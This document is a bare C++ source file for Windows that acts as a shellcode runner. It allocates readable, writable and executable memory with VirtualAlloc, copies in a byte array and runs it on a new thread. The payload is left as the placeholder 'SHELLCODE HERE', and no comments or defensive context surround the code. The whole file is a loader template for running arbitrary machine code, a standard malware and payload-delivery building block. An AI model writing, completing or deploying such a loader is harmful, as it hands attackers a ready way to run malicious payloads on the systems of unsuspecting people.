#include <windows.h>
#include <iostream>

int main() {
    unsigned char shellcode[] = {SHELLCODE HERE };
    void* exec_mem = VirtualAlloc(nullptr, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!exec_mem) {
        std::cerr << "Memory allocation fail." << std::endl;
        return -1;
    }
    memcpy(exec_mem, shellcode, sizeof(shellcode));
    HANDLE thread = CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE)exec_mem, nullptr, 0, nullptr);
    if (!thread) {
        std::cerr << "Thread creation fail." << std::endl;
        VirtualFree(exec_mem, 0, MEM_RELEASE);
        return -1;
    }

    WaitForSingleObject(thread, INFINITE);
    VirtualFree(exec_mem, 0, MEM_RELEASE);
    return 0;
}

